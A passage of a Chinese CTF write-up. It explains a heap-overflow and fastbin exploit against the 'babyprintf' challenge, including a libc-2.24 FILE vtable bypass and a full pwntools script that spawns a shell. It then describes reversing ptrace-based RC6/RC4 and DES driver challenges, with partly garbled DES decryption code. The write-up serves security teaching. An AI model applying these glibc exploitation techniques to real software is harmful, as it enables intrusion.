虽然如此，但leak libc地址还是可以的。这个我想大部分人都想到了。
然后重点就是如何使用程序唯一的堆溢出。没有free的问题 可以通过free topchunk解决，然后很多选手在这都使用了unsortedbin
attack拿到shell。
如何通过unsortedbin attack利用我就不多说了, 应该会有其他wp放出。我说一下如何利用 fastbin
attack解决这个问题。首先我们能free 一个top chunk，然后有了第一个就能有第二个，不断申请内存或者覆盖top
chunk的size可以很轻易的做到这点。同时，我们可以另下面那个的size为0x41，之后申请上面那个堆块就能把下面这个fastbin覆盖了。通过这个0x41的fastbin
attack, 我们可以覆盖到位于data段上的stdout指针，具体如下
    --------------------            --------------------      freed chunk1                       alloced
    --------------------            --------------------          dummy            ->                overflow
    --------------------            --------------------      freed chunk2(0x41)               chunk2->fd=target
    --------------------            --------------------
当然libc中是存在onegadget的，所以也有人直接去覆盖malloc_hook，这些都可以  
然后一个比较蛋疼的是libc-2.24的问题，因它为加入了新的对vtable的检验机制。如何绕过呢？这个方法很多，只要记得一点，我们已经能控制“整个“FILE结构体，这点如果稍微去看下源码的话应该能找到很多方法，这里提供一个替换vtable(
_IO_file_jumps)到另一个vtable( _IO_str_jumps), 利用两个vtable
defalut方法的不同拿到shell的解题脚本(偏移请自行更改)：
    from pwn import *
    context.log_level='debug'
    def pr(size,data):
        p.sendline(str(size))
        p.recv()
        p.sendline(data)
        p.recvuntil('result: ')
        return p.recvuntil('size: ')[:-5]
    p = process('./babyprintf')
    p.recvuntil('size: ')
    for i in range(32):
        pr(0xff0,'a')
    p.sendline('0xe00')
    p.recv()
    p.sendline('%llx')
    p.recvuntil('result: ')
    libc_addr = int('0x'+p.recv(12),16)-0x3c6780
    print 'libc: ',hex(libc_addr)
    p.recvuntil('size: ')
    pr(8,'a'*0x18+p64(0x1d1))
    pr(0x1d0,'1')
    pr(0x130,'1')
    pr(0xd00,'1')
    pr(0xa0,'a'*0xa8+p64(0x61))
    pr(0x200,'a')
    p.sendline('0x60')
    p.recvuntil('string: ')
    p.sendline('\x00'*0x2028+p64(0x41)+p64(0x601062))
    p.recv()
    pr(0x30,'a')
    system_addr = libc_addr + 0x45390
    sh_addr = libc_addr + 0x18cd17
    malloc_addr = libc_addr + 0x84130
    vtable_addr = libc_addr+0x3c37a0
    flag=2|0x8000
    fake_stream = p64(flag)+p64(0)
    fake_stream += p64(0)*2
    fake_stream += p64(0)
    fake_stream += p64(0x7fffffffffffffff)
    fake_stream = fake_stream.ljust(0x38,'\x00')
    fake_stream += p64(sh_addr)
    fake_stream += p64(sh_addr)
    fake_stream = fake_stream.ljust(0xc0,'\x00')
    fake_stream += p64(0xffffffffffffffff)
    fake_stream = fake_stream.ljust(0xd8,'\x00')
    fake_stream += p64(vtable_addr)
    fake_stream += p64(malloc_addr) #alloc
    fake_stream += p64(system_addr) #hook free
    p.sendline('0x30')
    p.sendline('a'*14+p64(0x601090)+p64(0)+fake_stream)
    p.interactive()
## level3
### ar_u_ok
主要考察对ptrace的认识和rc6,rc4的识别
#### 加密解密
真正的加密和解密过程很简单，就是一个标准的rc6，只要把函数中的那个int常量放到google里搜索一下就知道是rc6加密（这个函数的代码被rc4加密了，不不解密是看不到的）。
rc6加密和解密的代码见源码
#### 程序流程
程序首先判断启动参数，如果argc为1，则以debugger身份启动，利用fork分出parent和child。parent作为真正的debugger，child利用execve来启动自身并以父进程的pid作为启动参数。
如果argc为2，说明是debuggee。程序利用puts打印`plz_input_flag`，但是write的syscall被ptrace
hook了。puts的原始内容是乱码，需要debugger对其进行解密。
然后是利用scanf来接收flag。默认是允许输入`%48s`但是这里ptrace hook了read syscall，检测read
syscall触发的次数（在程序开头利用setbuf将stdin和stdout的缓冲调整为0）,从而使flag的真实最大长度为32。
接着是一段判断是否调试者为父进程的代码，没问题的话会调用fclose来关闭之前打开的文件。此处用ptrace hook了close
syscall。但是在程序运行前也会调用close syscall。这里利用设置变量的方式，使得在第二次close的时候触发。
触发时执行的代码是利用rc4将两个函数解密，然后patch代码为`0xcc`使程序停在检测trace代码的下一行，在将其patch成jmp到data段的那段唯一可视的雷军ascii字符处，并将flag传递给rdx，接着继续执行。雷军那段ascii其实是代码。前面的`52Mi!`是`xor
eax, 0x21694d32`，从而使后面的jne全部成立，`R_`是`push rdx;pop
rdi`，从而将之前在rdx中的flag传递到rdi中。利用`u_`这个jne跳转跳过中间的非代码区，最后jmp到encrypt函数中。
encrypt函数就是调用rc6加密，将32位的flag分16位两次加密，最后和enc结果比较。
由于调用了很多的ptrace来实现smc和hook，纯动态分析应该不太可能实现，需要静态分析后patch程序才能使用动态分析。
完整程序见github，由于有smc部分，可能在不同机子上编译结果不正确，所以提供了一个测试用的binary。
### ippatsu-nyuukon
#### 0x00 写在前面
设计思路：  
应用层与驱动层通信，在驱动层加密由应用层发送过来的明文后比较flag，并输出结果  
部分细节：
>   * 驱动层的分发函数分为2部分，SEND和RECV；  
>  SEND：接受从应用层发来的明文并加密，其本体是DES  
>  RECV：比较加密后的明文和加密flag
>   * 驱动层接受的明文，实际上只有第一次加密结果是正确的
>   * DES后将不可视数据转为hex
>   * 加密数据与加密flag比较前先异或同一个随机字节
>
#### 0x01 wp
跟到分发函数的SEND, 定位加密算法  
因为DES对称加密算法，所以从ida中抠出来，修改小部分并添加密文+key就可以跑解密脚本了
    // desrypt_des.cpp
    #include     
    #include     
    #define maxn 0x8000     // 理论支持明文长度
    //#define ENCODE 0,16,1       // 加密用的宏
    #define DECODE 15,-1,-1     // 解密用的宏    
    // 明文初始置换    
    char msg_ch[64] = {
        58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4,
        62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8,
        57, 49, 41, 33, 25, 17,  9, 1, 59, 51, 43, 35, 27, 19, 11, 3,
        61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7
    };
    // 密钥初始置换    
    char key_ch[56] = {
        57, 49, 41, 33, 25, 17,  9,  1, 58, 50, 42, 34, 26, 18,
        10,  2, 59, 51, 43, 35, 27, 19, 11,  3, 60, 52, 44, 36,
        63, 55, 47, 39, 31, 23, 15,  7, 62, 54, 46, 38, 30, 22,
        14,  6, 61, 53, 45, 37, 29, 21, 13,  5, 28, 20, 12,  4
    };
    // 扩展置换    
    char msg_ex[48] = {
        32,  1,  2,  3,  4,  5,  4,  5,  6,  7,  8,  9,
        8,  9, 10, 11, 12, 13, 12, 13, 14, 15, 16, 17,
        16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,
        24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32,  1
    };
    // 每轮密钥的位移    
    char key_mov[16] = {
        1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1
    };
    // 压缩置换    
    char key_cmprs[48] = {
        14, 17, 11, 24,  1,  5,  3, 28, 15,  6, 21, 10,
        23, 19, 12,  4, 26,  8, 16,  7, 27, 20, 13,  2,
        41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48,
        44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32
    };
    // S 盒置换    
    char s_box[8][6][16] = {
        // S1    
        14,  4, 13,  1,  2, 15, 11,  8,  3, 10,  6, 12,  5,  9,  0,  7,
        0, 15,  7,  4, 14,  2, 13,  1, 10,  6, 12, 11,  9,  5,  3,  8,
        4,  1, 14,  8, 13,  6,  2, 11, 15, 12,  9,  7,  3, 10,  5,  0,
        15, 12,  8,  2,  4,  9,  1,  7,  5, 11,  3, 14, 10,  0,  6, 13,
        // S2    
        15,  1,  8, 14,  6, 11,  3,  4,  9,  7,  2, 13, 12,  0,  5, 10,
        3, 13,  4,  7, 15,  2,  8, 14, 12,  0,  1, 10,  6,  9, 11,  5,
        0, 14,  7, 11, 10,  4, 13,  1,  5,  8, 12,  6,  9,  3,  2, 15,
        13,  8, 10,  1,  3, 15,  4,  2, 11,  6,  7, 12,  0,  5, 14,  9,
        // S3    
        10,  0,  9, 14,  6,  3, 15,  5,  1, 13, 12,  7, 11,  4,  2,  8,
        13,  7,  0,  9,  3,  4,  6, 10,  2,  8,  5, 14, 12, 11, 15,  1,
        13,  6,  4,  9,  8, 15,  3,  0, 11,  1,  2, 12,  5, 10, 14,  7,
        1, 10, 13,  0,  6,  9,  8,  7,  4, 15, 14,  3, 11,  5,  2, 12,
        // S4    
        7, 13, 14,  3,  0,  6,  9, 10,  1,  2,  8,  5, 11, 12,  4, 15,
        13,  8, 11,  5,  6, 15,  0,  3,  4,  7,  2, 12,  1, 10, 14,  9,
        10,  6,  9,  0, 12, 11,  7, 13, 15,  1,  3, 14,  5,  2,  8,  4,
        3, 15,  0,  6, 10,  1, 13,  8,  9,  4,  5, 11, 12,  7,  2, 14,
        // S5    
        2, 12,  4,  1,  7, 10, 11,  6,  8,  5,  3, 15, 13,  0, 14,  9,
        14, 11,  2, 12,  4,  7, 13,  1,  5,  0, 15, 10,  3,  9,  8,  6,
        4,  2,  1, 11, 10, 13,  7,  8, 15,  9, 12,  5,  6,  3,  0, 14,
        11,  8, 12,  7,  1, 14,  2, 13,  6, 15,  0,  9, 10,  4,  5,  3,
        // S6    
        12,  1, 10, 15,  9,  2,  6,  8,  0, 13,  3,  4, 14,  7,  5, 11,
        10, 15,  4,  2,  7, 12,  9,  5,  6,  1, 13, 14,  0, 11,  3,  8,
        9, 14, 15,  5,  2,  8, 12,  3,  7,  0,  4, 10,  1, 13, 11,  6,
        4,  3,  2, 12,  9,  5, 15, 10, 11, 14,  1,  7,  6,  0,  8, 13,
        // S7    
        4, 11,  2, 14, 15,  0,  8, 13,  3, 12,  9,  7,  5, 10,  6,  1,
        13,  0, 11,  7,  4,  9,  1, 10, 14,  3,  5, 12,  2, 15,  8,  6,
        1,  4, 11, 13, 12,  3,  7, 14, 10, 15,  6,  8,  0,  5,  9,  2,
        6, 11, 13,  8,  1,  4, 10,  7,  9,  5,  0, 15, 14,  2,  3, 12,
        // S8    
        13,  2,  8,  4,  6, 15, 11,  1, 10,  9,  3, 14,  5,  0, 12,  7,
        1, 15, 13,  8, 10,  3,  7,  4, 12,  5,  6, 11,  0, 14,  9,  2,
        7, 11,  4,  1,  9, 12, 14,  2,  0,  6, 10, 13, 15,  3,  5,  8,
        2,  1, 14,  7,  4, 10,  8, 13, 15, 12,  9,  0,  3,  5,  6, 11
    };
    // P 盒置换    
    char p_box[32] = {
        16, 7, 20, 21, 29, 12, 28, 17, 1,  15, 23, 26, 5,  18, 31, 10,
        2,  8, 24, 14, 32, 27, 3,  9,  19, 13, 30, 6,  22, 11, 4,  25
    };
    // 末置换    
    char last_ch[64] = {
        40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31,
        38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29,
        36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27,
        34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41,  9, 49, 17, 57, 25
    };
    // hash 置换，将加密后的密文置换为可读明文    
    char hs_ch[20] = "0123456789abcdef";
    char sh_ch[128];
    void init_trans() {
        char i;
        for (i = 0; i  0; j--) {
                dest[(i >= 1;
            }
        }
    }
    // 二进制转成字符    
    void BitToCh(char* dest, char* src, int length) {